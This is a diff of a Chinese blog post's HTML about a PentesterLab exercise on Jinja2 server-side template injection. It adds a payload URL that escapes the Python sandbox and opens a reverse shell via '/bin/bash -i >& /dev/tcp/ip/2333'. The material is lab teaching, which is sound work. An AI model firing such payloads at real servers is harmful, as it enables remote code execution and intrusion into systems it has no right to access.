@@ -406,8 +406,11 @@
 <li><p>今天又仔细研究了一下，发现了一种不依赖mro（Method Resolution Order）的方法。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/indexsystem.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;) &#125;&#125;</div></pre></td></tr></table></figure>
 </li>
-<li><p>同样可以反弹shell<br><img src="/2018/01/16/从一道pentesterlab的题目说起/shell2.png" alt=""><br><a href="http://ptl-17ec4297-24d9093a.libcurl.so/&lt;!--￼5--" target="_blank" rel="external">http://ptl-17ec4297-24d9093a.libcurl.so/&lt;!--￼5--</a>&gt;</p>
-<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
+<li><p>同样可以反弹shell<br><img src="/2018/01/16/从一道pentesterlab的题目说起/shell2.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.values()[138](&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;) &#125;&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><ul>
 <li>本来想写个长篇文章介绍SSTI原理以及python沙箱绕过原理的，后来发现无非还是翻译英文原著的文章，所以想了解原理的直接去看英文原版文章就好，0.0<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2</a>(<a href="https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/" target="_blank" rel="external">https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/</a>)<br><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="external">CSAW-CTF Python sandbox write-up</a></li>
 </ul>
 
